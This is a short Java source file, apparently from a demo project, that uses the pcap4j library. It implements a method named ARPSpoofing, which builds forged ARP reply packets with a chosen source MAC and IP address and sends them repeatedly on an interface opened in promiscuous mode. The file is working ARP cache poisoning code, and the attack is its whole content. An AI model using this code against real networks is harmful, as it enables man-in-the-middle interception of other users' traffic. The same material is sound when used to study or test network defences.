package com.rbac.demo.pcap4j;

import java.net.InetAddress;
import java.net.UnknownHostException;
import org.pcap4j.core.*;
import org.pcap4j.core.PcapNetworkInterface.PromiscuousMode;
import org.pcap4j.packet.ArpPacket;
import org.pcap4j.packet.EthernetPacket;
import org.pcap4j.packet.Packet;
import org.pcap4j.packet.namednumber.ArpHardwareType;
import org.pcap4j.packet.namednumber.ArpOperation;
import org.pcap4j.packet.namednumber.EtherType;
import org.pcap4j.util.ByteArrays;
import org.pcap4j.util.MacAddress;

public class ArpReply {
    private static final String READ_TIMEOUT_KEY = ArpReply.class.getName() + ".readTimeout";
    private static final int READ_TIMEOUT = Integer.getInteger(READ_TIMEOUT_KEY, 10); // [ms]

    private static final String SNAPLEN_KEY = ArpReply.class.getName() + ".snaplen";
    private static final int SNAPLEN = Integer.getInteger(SNAPLEN_KEY, 65536); // [bytes]

    public ArpReply() {}
    public void ARPSpoofing(String  destMac, String strDstIpAddress,String srcMac, String strSrcIpAddress,int num,String netCardIp)
            throws PcapNativeException, NotOpenException, UnknownHostException {
        MacAddress DES_MAC_ADDR=MacAddress.getByName(destMac);
        MacAddress SRC_MAC_ADDR=MacAddress.getByName(srcMac);
        InetAddress inetAddress=InetAddress.getByName(netCardIp);
        PcapNetworkInterface nif=Pcaps.getDevByAddress(inetAddress);  //获得网络接口
        PcapHandle sendHandle = nif.openLive(SNAPLEN, PromiscuousMode.PROMISCUOUS, READ_TIMEOUT);  //打开发送live
           /* Task t = new Task(handle, listener);
            pool.execute(t); //启动数据包侦听进程*/
            ArpPacket.Builder arpBuilder = new ArpPacket.Builder();
            try {
                arpBuilder
                        .hardwareType(ArpHardwareType.ETHERNET)
                        .protocolType(EtherType.IPV4)
                        .hardwareAddrLength((byte) MacAddress.SIZE_IN_BYTES)
                        .protocolAddrLength((byte) ByteArrays.INET4_ADDRESS_SIZE_IN_BYTES)
                        .operation(ArpOperation.REPLY)
                        .srcHardwareAddr(SRC_MAC_ADDR)
                        .srcProtocolAddr(InetAddress.getByName(strSrcIpAddress))
                        .dstHardwareAddr(DES_MAC_ADDR)
                        .dstProtocolAddr(InetAddress.getByName(strDstIpAddress));
            } catch (UnknownHostException e) {
                throw new IllegalArgumentException(e);
            }

            EthernetPacket.Builder etherBuilder = new EthernetPacket.Builder();
            etherBuilder
                    .dstAddr(DES_MAC_ADDR)
                    .srcAddr(SRC_MAC_ADDR)
                    .type(EtherType.ARP)
                    .payloadBuilder(arpBuilder)
                    .paddingAtBuild(true);

            for (int i = 0; i < num; i++) {
                Packet p = etherBuilder.build();
                System.out.println(p);
                sendHandle.sendPacket(p);
                try {
                    Thread.sleep(3000);
                } catch (InterruptedException e) {
                    break;
                }
            }
        }
}



